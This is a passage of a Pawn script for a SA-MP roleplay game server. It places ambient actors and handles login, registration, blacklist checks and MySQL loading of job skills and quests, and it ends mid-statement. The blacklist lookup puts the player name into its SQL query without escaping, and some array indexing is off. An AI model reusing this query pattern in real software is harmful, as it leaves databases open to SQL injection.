	actor_spawn[4] = CreateDynamicActor(1+random(311), 1606.6569,-2314.9468,13.9258,6.8658, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_spawn[5] = CreateDynamicActor(1+random(311), 1616.9268,-2313.3862,13.9258,177.4657, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_spawn[6] = CreateDynamicActor(1+random(311), 1589.0905,-2313.4995,13.9258,179.3691, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_spawn[7] = CreateDynamicActor(1+random(311), 1588.2671,-2313.3215,13.9258,180.9358, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_spawn[8] = CreateDynamicActor(1+random(311), 1583.1421,-2312.9529,13.9258,359.6824, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	ApplyDynamicActorAnimation(actor_spawn[0], "PED", "SEAT_idle", 2.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_spawn[1], "MISC", "seat_lr", 2.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_spawn[2], "PED", "IDLE_CHAT", 2.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_spawn[3], "SMOKING", "M_smkstnd_loop", 4.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_spawn[4], "GRAFFITI", "graffiti_Chkout", 4.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_spawn[5], "PED", "SEAT_idle", 2.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_spawn[6], "PED", "SEAT_idle", 2.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_spawn[7], "MISC", "seat_talk_02", 2.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_spawn[8], "RAPPING", "Laugh_01", 4.0, 1, 0, 0, 0, 0);

	// -- Zlatara
	new actor_zlatara[3];
	actor_zlatara[0] = CreateDynamicActor(1+random(311), 2006.9037,-1274.2947,23.9071,184.3593, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_zlatara[1] = CreateDynamicActor(1+random(311), 1993.0938,-1280.0931,23.9071,234.7572, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_zlatara[2] = CreateDynamicActor(1+random(311), 1993.9734,-1280.7081,23.9071,53.6487, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	//actor_zlatara[3] = CreateDynamicActor(1+random(311), 2022.9587,-1267.4767,23.9779,269.8276, 1, 100.0, -1, -1, -1, 200.0, -1, 0); //otvaranje paketica
	ApplyDynamicActorAnimation(actor_zlatara[0], "PED", "SEAT_idle", 2.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_zlatara[1], "MISC", "IDLE_CHAT_02", 2.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_zlatara[2], "RAPPING", "Laugh_01", 4.0, 1, 0, 0, 0, 0);
	//ApplyDynamicActorAnimation(actor_zlatara[3], "BOMBER", "BOM_Plant_Loop", 4.0, 1, 0, 0, 0, 0);

	// -- Igraonica
	new actor_igraona[7];
	actor_igraona[0] = CreateDynamicActor(1+random(311), 1294.4698,-1352.6769,35.7123,268.1503, 1, 100.0, 187, -1, -1, 200.0, -1, 0);
	actor_igraona[1] = CreateDynamicActor(1+random(311), 1294.4645,-1353.4431,35.7123,269.8619, 1, 100.0, 187, -1, -1, 200.0, -1, 0);
	actor_igraona[2] = CreateDynamicActor(1+random(311), 1288.7518,-1353.2535,35.8083,357.7646, 1, 100.0, 187, -1, -1, 200.0, -1, 0);
	actor_igraona[3] = CreateDynamicActor(1+random(311), 1288.6182,-1359.7338,35.8083,175.4028, 1, 100.0, 187, -1, -1, 200.0, -1, 0);
	actor_igraona[4] = CreateDynamicActor(1+random(311), 1292.4750,-1362.3354,35.8143,4.3213, 1, 100.0, 187, -1, -1, 200.0, -1, 0);
	actor_igraona[5] = CreateDynamicActor(1+random(311), 1295.4071,-1362.3995,35.8113,3.0680, 1, 100.0, 187, -1, -1, 200.0, -1, 0);
	actor_igraona[6] = CreateDynamicActor(1+random(311), 1287.2640,-1350.2472,35.8043,78.2687, 1, 100.0, 187, -1, -1, 200.0, -1, 0);
	ApplyDynamicActorAnimation(actor_igraona[0], "PED", "SEAT_idle", 4.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_igraona[1], "MISC", "seat_talk_01", 2.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_igraona[2], "MISC", "seat_talk_02", 2.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_igraona[3], "MISC", "seat_talk_01", 2.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_igraona[4], "COP_AMBIENT", "Coplook_loop", 4.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_igraona[5], "FOOD", "EAT_Burger", 3.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_igraona[6], "PED", "idle_taxi", 3.0, 1, 0, 0, 0, 0);

	// -- Bingo
	new actor_bingo[2];
	actor_bingo[0] = CreateDynamicActor(1+random(311), 1281.3611,-1542.7432,13.5390,226.2404, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_bingo[1] = CreateDynamicActor(1+random(311), 1281.3369,-1543.6997,13.5590,189.9167, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	ApplyDynamicActorAnimation(actor_bingo[0], "PED", "SEAT_idle", 4.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_bingo[1], "CLOTHES", "CLO_Buy", 4.0, 1, 0, 0, 0, 0);

	// -- Mehanicar
	new actor_meh[4];
	actor_meh[0] = CreateDynamicActor(50, 1815.4232,-1406.6641,13.5584,91.0321, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_meh[1] = CreateDynamicActor(268, 1817.0024,-1409.5182,13.5584,181.5862, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_meh[2] = CreateDynamicActor(42, 1820.0403,-1417.1592,13.6016,137.4057, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_meh[3] = CreateDynamicActor(1+random(311), 1828.8987,-1433.8124,13.6016,266.9585, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	ApplyDynamicActorAnimation(actor_meh[0], "BAR", "Barserve_bottle", 3.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_meh[1], "OTB", "wtchrace_loop", 4.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_meh[2], "RAPPING", "Laugh_01", 4.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_meh[3], "SMOKING", "M_smkstnd_loop", 4.0, 1, 0, 0, 0, 0);

	// -- Pilot
	new actor_pilot;
	actor_pilot = CreateDynamicActor(16, 1927.4725,-2461.0498,13.5391,1.6541, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	ApplyDynamicActorAnimation(actor_pilot, "POLICE", "CopTraf_come", 4.0, 1, 0, 0, 0, 0);

	// -- Prevoznik Novca
	new actor_prev;
	actor_prev = CreateDynamicActor(71, 1528.3992,-1026.2318,24.1019,165.1192, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	ApplyDynamicActorAnimation(actor_prev, "COP_AMBIENT", "Coplook_loop", 4.0, 1, 0, 0, 0, 0);

	// -- Sheriff
	new actor_sheriff[5];
	actor_sheriff[0] = CreateDynamicActor(282, 623.2723,-602.5912,17.0746,266.9358, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_sheriff[1] = CreateDynamicActor(283, 610.9981,-609.9790,17.2178,230.2988, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_sheriff[2] = CreateDynamicActor(310, 634.5396,-608.9567,16.3272,357.0115, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_sheriff[3] = CreateDynamicActor(288, 632.4532,-568.5701,16.3359,359.2909, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	actor_sheriff[4] = CreateDynamicActor(311, 632.3479,-567.6504,16.3359,184.4201, 1, 100.0, -1, -1, -1, 200.0, -1, 0);
	ApplyDynamicActorAnimation(actor_sheriff[0], "PAULNMAC", "Piss_loop", 4.0, 1, 1, 1, 1, 0);
	ApplyDynamicActorAnimation(actor_sheriff[1], "PAULNMAC", "wank_loop", 1.800001, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_sheriff[2], "SMOKING","M_smkstnd_loop", 4.0, 1, 1, 1, 1, 0);
	ApplyDynamicActorAnimation(actor_sheriff[3], "MISC", "IDLE_CHAT_02", 2.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_sheriff[4], "PED", "IDLE_CHAT", 2.0, 1, 0, 0, 0, 0);

	// -- Dillimore Gas Station
	new actor_dgs[3];
	actor_dgs[0] = CreateDynamicActor(50, 654.7815,-571.2590,16.5015,272.8926, 1, 100.0, -1, -1, -1, 100.0, -1, 0);
	actor_dgs[1] = CreateDynamicActor(254, 664.1474,-568.4584,16.3433,359.7100, 1, 100.0, -1, -1, -1, 100.0, -1, 0);
	actor_dgs[2] = CreateDynamicActor(69, 664.1984,-566.3386,16.3433,184.8685, 1, 100.0, -1, -1, -1, 100.0, -1, 0);
	ApplyDynamicActorAnimation(actor_dgs[0], "BAR", "Barserve_bottle", 3.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_dgs[1], "SHOP", "ROB_Loop_Threat", 4.0, 1, 0, 0, 0, 0);
	ApplyDynamicActorAnimation(actor_dgs[2], "ped", "handsup", 4.1, 0, 0, 0, 0, 0);

	// -- Casino Int
	new actor_casino[23];
	actor_casino[0] = CreateDynamicActor((random(2) == 1 ? 171 : 172), -1995.2339,-769.3915,1497.4769,356.8797, 1, 100.0, -1, 3, -1, 100.0, -1, 0);
	actor_casino[1] = CreateDynamicActor((random(2) == 1 ? 171 : 172), -2000.5040,-764.3620,1497.4769,269.4589, 1, 100.0, -1, 3, -1, 100.0, -1, 0);
	actor_casino[2] = CreateDynamicActor((random(2) == 1 ? 171 : 172), -1988.4227,-769.3726,1497.4760,0.9765, 1, 100.0, -1, 3, -1, 100.0, -1, 0);
	actor_casino[3] = CreateDynamicActor((random(2) == 1 ? 171 : 172), -1981.3093,-769.3669,1497.4769,358.4697, 1, 100.0, -1, 3, -1, 100.0, -1, 0);
	actor_casino[4] = CreateDynamicActor((random(2) == 1 ? 171 : 172), -1979.3296,-753.6984,1497.4738,89.9639, 1, 100.0, -1, 3, -1, 100.0, -1, 0);
	actor_casino[5] = CreateDynamicActor((random(2) == 1 ? 171 : 172), -1979.2914,-756.7593,1497.4738,107.1974, 1, 100.0, -1, 3, -1, 100.0, -1, 0);
	actor_casino[6] = CreateDynamicActor((random(2) == 1 ? 171 : 172), -1977.6564,-747.4911,1497.4769,89.6506, 1, 100.0, -1, 3, -1, 100.0, -1, 0);
	actor_casino[7] = CreateDynamicActor((random(2) == 1 ? 171 : 172), -1977.6632,-742.9549,1497.4769,87.1439, 1, 100.0, -1, 3, -1, 100.0, -1, 0);
	actor_casino[8] = CreateDynamicActor(1+random(311), -1981.5073,-738.6664,1497.4769,178.3248, 1, 100.0, -1, 3, -1, 100.0, -1, 0);
	actor_casino[9] = CreateDynamicActor(1+random(311), -1987.9854,-738.6667,1497.4769,179.2648, 1, 100.0, -1, 3, -1, 100.0, -1, 0);
	actor_casino[10] = CreateDynamicActor(1+random(311), -1994.5756,-738.6657,1497.4769,178.6381, 1, 100.0, -1, 3, -1, 100.0, -1, 0);
	actor_casino[11] = CreateDynamicActor(1+random(311), -2000.0277,-741.5833,1497.4769,267.9389, 1, 100.0, -1, 3, -1, 100.0, -1, 0);
	actor_casino[12] = CreateDynamicActor(1+random(311), -2000.0417,-746.5731,1497.4769,270.1323, 1, 100.0, -1, 3, -1, 100.0, -1, 0);
	actor_casino[13] = CreateDynamicActor(1+random(311), -1980.8972,-753.8635,1497.4810,277.0256, 1, 100.0, -1, 3, -1, 100.0, -1, 0);
	actor_casino[14] = CreateDynamicActor(1+random(311), -2003.0283,-737.3451,1500.9690,269.7955, 1, 100.0, -1, 3, -1, 100.0, -1, 0);
	actor_casino[15] = CreateDynamicActor(1+random(311), -2003.0364,-740.7755,1500.9688,268.8555, 1, 100.0, -1, 3, -1, 100.0, -1, 0);
	actor_casino[16] = CreateDynamicActor(1+random(311), -2009.5099,-741.5318,1500.9688,89.6505, 1, 100.0, -1, 3, -1, 100.0, -1, 0);
	actor_casino[17] = CreateDynamicActor((random(2) == 1 ? 164 : 165), -2010.4390,-750.5659,1500.9688,268.7105, 1, 100.0, -1, 3, -1, 100.0, -1, 0);
	actor_casino[18] = CreateDynamicActor((random(2) == 1 ? 164 : 165), -2010.6281,-758.4472,1500.9688,271.2172, 1, 100.0, -1, 3, -1, 100.0, -1, 0);
	actor_casino[19] = CreateDynamicActor((random(2) == 1 ? 164 : 165), -1977.3271,-761.2045,1497.4738,87.2888, 1, 100.0, -1, 3, -1, 100.0, -1, 0);
	actor_casino[20] = CreateDynamicActor((random(2) == 1 ? 164 : 165), -1984.6547,-744.2553,1497.4738,181.1447, 1, 100.0, -1, 3, -1, 100.0, -1, 0);
	ApplyDynamicActorAnimation(actor_casino[13], "MISC", "IDLE_CHAT_02", 2.0, 1, 0, 0, 0, 0); //talk2
	ApplyDynamicActorAnimation(actor_casino[22], "OTB", "wtchrace_loop", 4.0, 1, 0, 0, 0, 0); //crossarms2
	ApplyDynamicActorAnimation(actor_casino[19], "COP_AMBIENT", "Coplook_loop", 4.0, 1, 0, 0, 0, 0); //crossarms1
	ApplyDynamicActorAnimation(actor_casino[20], "OTB", "wtchrace_loop", 4.0, 1, 0, 0, 0, 0); //crossarms2
}

_:public GetXYZInFrontOfPlayer(playerid, &Float:xbr, &Float:ybr, &Float:zbr, Float:distance)
{
	new Float:a;
	GetPlayerPos(playerid, xbr, ybr, zbr);
	GetPlayerFacingAngle(playerid, a);

	xbr += (distance * floatsin (-a, degrees));
	ybr += (distance * floatcos (-a, degrees));
}

public OnUnoccupiedVehicleUpdate( vehicleid, playerid, passenger_seat, Float:new_x, Float:new_y, Float:new_z, Float:vel_x, Float:vel_y, Float:vel_z )
{
	GetVehiclePos( vehicleid, new_x, new_y, new_z );

	if( RealVehiclePositions[ vehicleid ][ 0 ] != 0 && RealVehiclePositions[ vehicleid ][ 1 ] != 0 && RealVehiclePositions[ vehicleid ][ 2 ] != 0 )
	{
        if( IsVehiclePrikolica( vehicleid ) )
		{
			if( IsValidVehicle( LastPullingVehicle[ vehicleid ] ) )
			{
				new Float:distance = GetVehicleDistanceFromPoint( LastPullingVehicle[ vehicleid ], new_x, new_y, new_z );
				if( distance <= 15 )
				{
					RealVehiclePositions[ vehicleid ][ 0 ] = new_x;
					RealVehiclePositions[ vehicleid ][ 1 ] = new_y;
					RealVehiclePositions[ vehicleid ][ 2 ] = new_z;
					return 1;
				}
			}
		}
		if( GetVehicleDistanceFromPoint( vehicleid, RealVehiclePositions[ vehicleid ][ 0 ], RealVehiclePositions[ vehicleid ][ 1 ], RealVehiclePositions[ vehicleid ][ 2 ] ) > 50.0 )
		{
			SetVehiclePos( vehicleid, RealVehiclePositions[ vehicleid ][ 0 ], RealVehiclePositions[ vehicleid ][ 1 ], RealVehiclePositions[ vehicleid ][ 2 ] );
			return 0;
		}
 	}
	GetVehiclePos( vehicleid, RealVehiclePositions[ vehicleid ][ 0 ], RealVehiclePositions[ vehicleid ][ 1 ], RealVehiclePositions[ vehicleid ][ 2 ] );
	return 1;
}

public OnPlayerRequestClass( playerid, classid )
{
	if( PlayerLogged[ playerid ] == true )
	{
		SMG_SetSpawnInfo( playerid );
    	SpawnPlayer( playerid );
	}
    else return 0;
	return 1;
}

_:public Login( playerid )
{
    ClearChat( playerid, 20 );
    Login_TDControl(playerid, true);

    format( sDStrg, sizeof( sDStrg ), DialogTekstovi[ 0 ], MAX_POKUSAJ_LOGINA );
	ShowPlayerDialog( playerid, dialog_LOGIN, DIALOG_STYLE_PASSWORD, D_NASLOV, sDStrg, "Potvrdi", "Odustani" );

	LoginTime[ playerid ] = SetPlayerTimerEx(playerid, "KickIgraca", 60000, false, "i", playerid);

 	login_showed[ playerid ] = true;
	first_spawn[ playerid ] = true;
	clothes_load[ playerid ] = true;
	quests_load[playerid] = true;
	skills_load[playerid] = true;
	return 1;
}

_:public InterpolatePogledLogin(playerid)
{
    TogglePlayerSpectating(playerid, true);
	SetPlayerInterior( playerid, 0 );
	SetPlayerVirtualWorld( playerid, playerid+1 );
	SMG_SetPlayerPos( playerid, 1463.7633,-1041.4501,26.8281);
	
	InterpolateCameraPos(playerid, 1425.365966, -859.783691, 433.052825, 1440.576660, -930.453979, 101.858718, 10000);
	InterpolateCameraLookAt(playerid, 1425.361206, -859.347961, 428.071838, 1439.979492, -925.514892, 101.359870, 10000);
    ClearChat(playerid, 50);
	return 1;
}

_:public Register(playerid)
{
	TogglePlayerSpectating(playerid, true);
	InterpolateCameraPos(playerid, 1310.5576, -1303.4440, 117.0473, 1370.7799, -975.1217, 77.5888, 45000, CAMERA_MOVE);
	InterpolateCameraLookAt(playerid, 1310.7336, -1302.4554, 116.7872, 1371.0105, -974.1444, 77.6086, 30000, CAMERA_MOVE);
	ClearChat(playerid, 50);

	PocetniIntro(playerid, 1);
	PocetniIntroStartovan[ playerid ] = true;
	playerInIntro[playerid] = true;
	return 1;
}

_:public Register_2(playerid) 
{
	TogglePlayerSpectating(playerid, false);
 	InterpolateCameraPos(playerid, 1430.4233, -983.3195, 1006.5151, 1439.1078, -983.3801, 1006.5151, 45000, CAMERA_MOVE);
	InterpolateCameraLookAt(playerid, 1430.7269, -982.3676, 1006.1650, 1438.6672, -982.4836, 1006.1701, 42000, CAMERA_MOVE);
	ClearChat(playerid, 50);

	ControlIntroTextDraws(playerid, false);
	RegisterTDControl(playerid, true);
    SelectTextDraw(playerid, 0x4282C0FF);
    SMG_SetPlayerSkin(playerid, MALE_SKIN);
	return 1;
}

_:public GPSpeed( playerid )
{
    new Float:ST_0, Float:ST_1, Float:ST_2, Float:ST_3;
    if(IsPlayerInAnyVehicle(playerid))
    GetVehicleVelocity(GetPlayerVehicleID(playerid), ST_0, ST_1, ST_2);
    else GetPlayerVelocity(playerid, ST_0, ST_1, ST_2);
    ST_3 = floatsqroot(floatpower(floatabs(ST_0), 2.0) + floatpower(floatabs(ST_1), 2.0) + floatpower(floatabs(ST_2), 2.0)) * 179.28625;
    return floatround(ST_3);
}

_:public ActionEffect(playerid)
{
    if( PlayerLogged[ playerid ] == true )
	{
    	#if ZIMSKI_MOD == 1

			if( GetPlayerInterior( playerid ) == 0 && GetPlayerVirtualWorld( playerid ) == 0 )
			{
			    RemovePlayerAttachedObject(playerid, OBJECT_SLOT_6);
			    SetPlayerAttachedObject(playerid, OBJECT_SLOT_6, 18696, 2, 0.0, 0.1, -0.2, 25.5000, 25.0, 25.0, 0.10, 0.3, 0.15);

			    if( GPSpeed( playerid ) > 10 && PlayerRun[ playerid ] == 0 )
				{
			        KillTimer(action_effect[playerid]);
			        action_effect[playerid] = SetPlayerTimerEx(playerid, "ActionEffect", 750, true, "i", playerid);
			        PlayerRun[ playerid ] = 1;
			    }
			    else if( GPSpeed( playerid ) < 10 && PlayerRun[ playerid ] == 1 )
				{
			        KillTimer(action_effect[playerid]);
			        action_effect[playerid] = SetPlayerTimerEx(playerid, "ActionEffect", 1750, true, "i", playerid);
			        PlayerRun[ playerid ] = 0;
			    }
			}

		#endif
	}
}

public OnPlayerConnect(playerid) 
{
	#if XMAS_MOD == 1

		PlayAudioStreamForPlayer(playerid, "https://www.dropbox.com/s/aes1j33u9ole7pv/Train_-_Shake_Up_Christmas.mp3?dl=1");

	#elseif ZIMSKI_MOD == 1

		PlayAudioStreamForPlayer(playerid, "https://www.dropbox.com/s/n3p348ed0fjkv2r/Dean%20Martin%20-%20Let%20it%20Snow%21%20Let%20It%20Snow%21%20Let%20It%20Snow%21.mp3?dl=1");

	#else

		PlayAudioStreamForPlayer(playerid, "http://k007.kiwi6.com/hotlink/6v0fbvlmwh/ultimate_music.mp3");

	#endif

    ServerInfo[BrojPosetaServeru]++;

	if( ServerInfo[ RekordServera ] < Iter_Count(Player) )
	{
	    ServerInfo[ RekordServera ] = Iter_Count(Player);
	}

    PlayerInfo[playerid][xID] = 0;

    ResetPlayer(playerid);
    PreloadAnimations(playerid);

    #include maps\Bases_Remove
    #include maps\Jobs_Remove
    #include maps\Main_Locations_Remove
    #include maps\Factions_Remove
    #include maps\Other_Locations_Remove
    #include maps\Houses_Remove

	SetPlayerVirtualWorld(playerid, (playerid + 2000));
    SetPlayerColor(playerid, 0xFFFFFFFF);

    #if ZIMSKI_MOD == 1

		action_effect[playerid] = SetPlayerTimerEx(playerid, "ActionEffect", 1750, true, "i", playerid);

	#endif

	if(DailyRecord < Iter_Count(Player))
	{
		DailyRecord = Iter_Count(Player);
		OOCNews(0x4282C0FF, "(U): Danasnji novi rekord je {FFFFFF}%d. {4282C0}Uzivajte uz Ultimate RPG.", DailyRecord);
	}

	CreatePlayerTextDraws(playerid);

    static str[62+24];
    GetPlayerIp(playerid, str, 22);
	WriteLog("log-connect",  "Igrac: %s | IP: %s", ImeIgraca(playerid), str);
	mysql_format(mSQL, str, sizeof(str), "SELECT `Name` FROM `blacklist` WHERE `Name` = '%s' LIMIT 1", ImeIgraca(playerid));
	mysql_tquery(mSQL, str, "CheckPlayerBlacklist", "i", playerid);
	return 1;
}

_:public CheckPlayerBlacklist(playerid)
{
	new
		rows,
		fields,
		str[160];

	cache_get_data(rows, fields, mSQL);
	if(rows)
	{
		AdminMsg(ADM_WARN, "[ADMIN] BlackListovano ime '%s' je pokusalo pristupiti serveru.", ImeIgraca(playerid));
		SendClientMessage( playerid, 0x000000FF, "#BLACKLIST: {FFFFFF}Vase ime je BLACK LISTOVANO sto znaci da nemate pristup ovom serveru." );
		SetPlayerTimerEx(playerid, "KickIgraca", 100, false, "i", playerid);
	}
	else
	{
		mysql_format(mSQL, str, sizeof(str), "SELECT `registered`, `password`, `user_id`, `skin_id` FROM `users` WHERE `p_name` = '%e' LIMIT 1", ImeIgraca(playerid));
		mysql_tquery(mSQL, str, "CheckPlayerAccount", "i", playerid);
	}
	return 1;
}

_:public CheckPlayerAccount( playerid )
{
    new rows, fields;
    cache_get_data( rows, fields, mSQL );

    if( !rows )
	{
        if( !IsRpNickname( ImeIgraca( playerid ) ) )
		{
			SendClientMessage( playerid, CRVENA, "#NON-RP NICKNAME: {FFFFFF}Dobili ste kick zbog krivo formatiranog imena." );
			SendClientMessage( playerid, CRVENA, "#NON-RP NICKNAME: {FFFFFF}Vase ime mora biti u formatu {FA5555}'Ime_Prezime'." );
			SetPlayerTimerEx(playerid, "KickIgraca", 50, false, "i", playerid);
			return 1;
		}

	    if( ServerInfo[ Registracija ] == false )
		{
			SendClientMessage( playerid, CRVENA, "#REGISTER: {FFFFFF}REGISTRACIJA JE TRENUTNO ONEMOGUCENA." );
			SendClientMessage( playerid, CRVENA, "#REGISTER: {FFFFFF}ULTIMATE ADMIN TEAM." );
			SetPlayerTimerEx(playerid, "KickIgraca", 50, false, "i", playerid);
            return 1;
	    }

	    Register(playerid);
    }
    else
	{
        cache_get_field_content( 0, "password", PlayerInfo[ playerid ][ xLozinka ], mSQL, 150 );
		PlayerInfo[ playerid ][ xRegistrovan ] = cache_get_field_content_int( 0, "registered" );
		PlayerInfo[ playerid ][ xID ] = cache_get_field_content_int( 0, "user_id" );
		PlayerInfo[ playerid ][ xSkin ] = cache_get_field_content_int( 0, "skin_id" );
		
        if( PlayerInfo[ playerid ][ xRegistrovan ] == 1 )
		{
            new query[128];
			mysql_format( mSQL, query, sizeof(query), "SELECT * FROM `banned` WHERE `user_id` = '%d' LIMIT 1", PlayerInfo[ playerid ][ xID ] );
			mysql_tquery( mSQL, query, "CheckPlayerBan", "i", playerid );
		}
		else
		{
		    if( ServerInfo[ Registracija ] == false )
			{
		        SendClientMessage( playerid, CRVENA, "#REGISTER: {FFFFFF}REGISTRACIJA JE TRENUTNO ONEMOGUCENA." );
				SendClientMessage( playerid, CRVENA, "#REGISTER: {FFFFFF}ULTIMATE ADMIN TEAM." );
		        SetPlayerTimerEx(playerid, "KickIgraca", 50, false, "i", playerid);
		        return 1;
		    }

			Register(playerid);
		}
    }
	return 1;
}

_:public checkPlayerJobSkills(playerid) 
{
	new rows, fields;
	cache_get_data(rows, fields, mSQL);

	if(rows) 
	{
		jskInfo[playerid][skill_Mehanicar] = cache_get_field_content_int(0, "skill_mehanicar");
		jskInfo[playerid][skill_PMunicije] = cache_get_field_content_int(0, "skill_pmunicije");
		jskInfo[playerid][skill_Pilot] = cache_get_field_content_int(0, "skill_pilot");
		jskInfo[playerid][skill_Rudar] = cache_get_field_content_int(0, "skill_rudar");
		jskInfo[playerid][skill_PNovca] = cache_get_field_content_int(0, "skill_pnovca");
		jskInfo[playerid][skill_Uber] = cache_get_field_content_int(0, "skill_uber");
		jskInfo[playerid][skill_PNamjestaja] = cache_get_field_content_int(0, "skill_pnamjestaja");
	}
	else 
	{
		new q[250];
		mysql_format(mSQL, q, sizeof(q), 
										"INSERT INTO `job_skills` (user_id, skill_mehanicar, skill_pmunicije, skill_pilot, skill_rudar, skill_pnovca, skill_uber, skill_pnamjestaja) \
										VALUES('%d', '1', '1', '1', '1', '1', '1', '1')", PlayerInfo[playerid][xID]);
		mysql_tquery(mSQL, q);
	}
	return 1;
}

_:public sql_updatejobskills(playerid) 
{
	new q[512];
	mysql_format(mSQL, q, sizeof(q), "UPDATE `job_skills` SET `skill_mehanicar`='%d', `skill_pmunicije`='%d', `skill_pilot`='%d', `skill_rudar`='%d', `skill_pnovca`='%d', `skill_uber`='%d', `skill_pnamjestaja`='%d' WHERE `user_id`='%d'",
										jskInfo[playerid][skill_Mehanicar],
										jskInfo[playerid][skill_PMunicije],
										jskInfo[playerid][skill_Pilot],
										jskInfo[playerid][skill_Rudar],
										jskInfo[playerid][skill_PNovca],
										jskInfo[playerid][skill_Uber],
										jskInfo[playerid][skill_PNamjestaja],
										PlayerInfo[playerid][xID]);
	mysql_tquery(mSQL, q);
	return 1;
}

_:public checkPlayerQuests(playerid) 
{
	new rows, fields;
	cache_get_data(rows, fields, mSQL);

	if(rows) 
	{
		questInfo[playerid][qt_EasyQuest][0] = bool:cache_get_field_content_int(0, "easy_quest_1");
		questInfo[playerid][qt_EasyQuest][1] = bool:cache_get_field_content_int(0, "easy_quest_2");
		questInfo[playerid][qt_EasyQuest][2] = bool:cache_get_field_content_int(0, "easy_quest_3");
		questInfo[playerid][qt_EasyQuest][3] = bool:cache_get_field_content_int(0, "easy_quest_4");
		questInfo[playerid][qt_EasyQuest][4] = bool:cache_get_field_content_int(0, "easy_quest_5");
		questInfo[playerid][qt_EasyQuest][5] = bool:cache_get_field_content_int(0, "easy_quest_6");
		questInfo[playerid][qt_EasyQuest][6] = bool:cache_get_field_content_int(0, "easy_quest_7");
		questInfo[playerid][qt_EasyQuest][7] = bool:cache_get_field_content_int(0, "easy_quest_8");
		questInfo[playerid][qt_EasyQuest][8] = bool:cache_get_field_content_int(0, "easy_quest_9");
		questInfo[playerid][qt_EasyQuest][9] = bool:cache_get_field_content_int(0, "easy_quest_10");

		questInfo[playerid][qt_EasyRewardQuest][0] = bool:cache_get_field_content_int(0, "easy_reward_quest_1");
		questInfo[playerid][qt_EasyRewardQuest][1] = bool:cache_get_field_content_int(0, "easy_reward_quest_2");
		questInfo[playerid][qt_EasyRewardQuest][2] = bool:cache_get_field_content_int(0, "easy_reward_quest_3");
		questInfo[playerid][qt_EasyRewardQuest][3] = bool:cache_get_field_content_int(0, "easy_reward_quest_4");
		questInfo[playerid][qt_EasyRewardQuest][4] = bool:cache_get_field_content_int(0, "easy_reward_quest_5");
		questInfo[playerid][qt_EasyRewardQuest][5] = bool:cache_get_field_content_int(0, "easy_reward_quest_6");
		questInfo[playerid][qt_EasyRewardQuest][6] = bool:cache_get_field_content_int(0, "easy_reward_quest_7");
		questInfo[playerid][qt_EasyRewardQuest][7] = bool:cache_get_field_content_int(0, "easy_reward_quest_8");
		questInfo[playerid][qt_EasyRewardQuest][8] = bool:cache_get_field_content_int(0, "easy_reward_quest_9");
		questInfo[playerid][qt_EasyRewardQuest][9] = bool:cache_get_field_content_int(0, "easy_reward_quest_10");
	}
	else 
	{
		new q[1000];
		mysql_format(mSQL, q, sizeof(q), 
			"INSERT INTO `quests` (user_id, easy_quest_1, easy_quest_2, easy_quest_3, easy_quest_4, easy_quest_5, easy_quest_6, easy_quest_7, easy_quest_8, easy_quest_9, easy_quest_10, \
			easy_reward_quest_1, easy_reward_quest_2, easy_reward_quest_3, easy_reward_quest_4, easy_reward_quest_5, easy_reward_quest_6, easy_reward_quest_7, easy_reward_quest_8, easy_reward_quest_9, easy_reward_quest_10) \
			VALUES('%d', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0')", PlayerInfo[playerid][xID]);
		mysql_tquery(mSQL, q);
	}
	return 1;
}

_:public sql_UpdateQuest(playerid) 
{
	new qQuest[1000];
	mysql_format(mSQL, qQuest, sizeof(qQuest), "UPDATE `quests` \
		SET `easy_quest_1`='%d', `easy_quest_2`='%d', `easy_quest_3`='%d', `easy_quest_4`='%d', `easy_quest_5`='%d', `easy_quest_6`='%d', `easy_quest_7`='%d', `easy_quest_8`='%d', \
		`easy_quest_9`='%d', `easy_quest_10`='%d' WHERE `user_id`='%d'",
